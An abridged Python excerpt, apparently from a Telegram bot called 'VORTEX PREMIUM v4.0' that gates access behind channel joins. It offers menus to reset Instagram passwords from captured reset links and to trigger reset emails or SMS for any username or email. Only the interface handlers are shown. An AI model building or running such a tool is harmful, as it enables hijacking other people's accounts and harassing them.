...
async def callback_handler(event):
    ...
    if data == b"joined":
        ...
        if all_joined:
            ...
            await event.edit("**✅ VERIFIED!**\n\n**🔐 VORTEX PREMIUM v4.0**\n\nChoose your option:",buttons=make_start_buttons())
        else:
            msg = "❌ **NOT VERIFIED**\n\n"
            for idx in nj:
                cd = CHANNELS.get(idx,{})
    ...
    if data == b"mode_link":
        ...
        await event.edit("**🔐 RESET VIA LINK MODE**\n\n📌 **STEPS:**\n1️⃣ Send Instagram **Reset Link** (with uidb36=)\n2️⃣ Send **New Password**\n3️⃣ Done ✅\n\n**📤 Send reset link:**",buttons=[[Button.inline("🔙 Back to Menu",b"back_menu")]])
        return
    
    if data == b"mode_recovery":
        user_state[uid] = {"step":"recovery_username","mode":"recovery"}
        await event.edit("**📧 ACCOUNT RECOVERY MODE**\n\nSend Instagram **Username or Email**\nto trigger password reset email/SMS.\n\n**📤 Send username or email:**",buttons=[[Button.inline("🔙 Back to Menu",b"back_menu")]])
        return
    
    if data == b"back_menu":
        user_state[uid] = {"step":"mode_select","mode":"link"}
        await event.edit("**🔐 VORTEX PREMIUM v4.0**\n\nChoose your option:",buttons=make_start_buttons())
        return
...
async def start_cmd(event):
    ...
    if all_joined:
        user_state[uid] = {"step":"mode_select","mode":"link"}
        await event.respond("**🔐 VORTEX PREMIUM v4.0**\n\n✅ **ACCESS GRANTED**\n\nChoose your option:",buttons=make_start_buttons())
    else:
...
async def dm_msg_handler(event):
    ...
    if uid not in user_state: user_state[uid] = {"step":"mode_select","mode":"link"}
    st = user_state[uid]
    
    if st["step"] == "mode_select":
        return await event.respond("**🔐 VORTEX PREMIUM v4.0**\n\nChoose your option:",buttons=make_start_buttons())
        ...
        try:
            ...
            if data.get("ok") and data.get("result"):
                for update in data["result"]:
                    ...
                    if text.startswith("/"):
                        if text == "/start":
                            send_bot_message(chat_id,"**🔐 VORTEX PREMIUM v4.0**\n\n✅ **ACCESS GRANTED**\n\nChoose an option below 👇",message_id)
                            user_state[uid] = {"step":"mode_select","mode":"link"}
                        continue
                    ...
                    if st["step"] == "mode_select":
                        send_bot_message(chat_id,"**🔐 VORTEX PREMIUM v4.0**\n\nPlease use buttons. Send /start in DM.",message_id)
                        continue
...
async def handle_bot_callback(uid, cb_data, cb_data_full):
    try:
        ...
        if cb_data == "joined":
            ...
            if all_joined:
                user_state[uid] = {"step":"mode_select","mode":"link"}
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",json={"chat_id":chat_id,"message_id":message_id,"text":"**✅ VERIFIED!**\n\n**🔐 VORTEX PREMIUM v4.0**\n\nChoose your option:","parse_mode":"Markdown","reply_markup":{"inline_keyboard":[[{"text":"🔐 RESET VIA LINK","callback_data":"mode_link"}],[{"text":"📧 RECOVERY (Email/SMS)","callback_data":"mode_recovery"}]]}},timeout=5)
            else:
        ...
        if cb_data == "mode_link":
            user_state[uid] = {"step":"link","mode":"link"}
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",json={"chat_id":chat_id,"message_id":message_id,"text":"**🔐 RESET VIA LINK MODE**\n\n📌 **STEPS:**\n1️⃣ Send Instagram **Reset Link**\n2️⃣ Send **New Password**\n3️⃣ Done ✅\n\n**📤 Send reset link:**","parse_mode":"Markdown","reply_markup":{"inline_keyboard":[[{"text":"🔙 Back to Menu","callback_data":"back_menu"}]]}},timeout=5)
        elif cb_data == "mode_recovery":
            user_state[uid] = {"step":"recovery_username","mode":"recovery"}
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",json={"chat_id":chat_id,"message_id":message_id,"text":"**📧 ACCOUNT RECOVERY MODE**\n\nSend Instagram **Username or Email**\nto trigger password reset email/SMS.\n\n**📤 Send username or email:**","parse_mode":"Markdown","reply_markup":{"inline_keyboard":[[{"text":"🔙 Back to Menu","callback_data":"back_menu"}]]}},timeout=5)
        elif cb_data == "back_menu":
            user_state[uid] = {"step":"mode_select","mode":"link"}
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",json={"chat_id":chat_id,"message_id":message_id,"text":"**🔐 VORTEX PREMIUM v4.0**\n\nChoose your option:","parse_mode":"Markdown","reply_markup":{"inline_keyboard":[[{"text":"🔐 RESET VIA LINK","callback_data":"mode_link"}],[{"text":"📧 RECOVERY (Email/SMS)","callback_data":"mode_recovery"}]]}},timeout=5)
    except Exception as e:
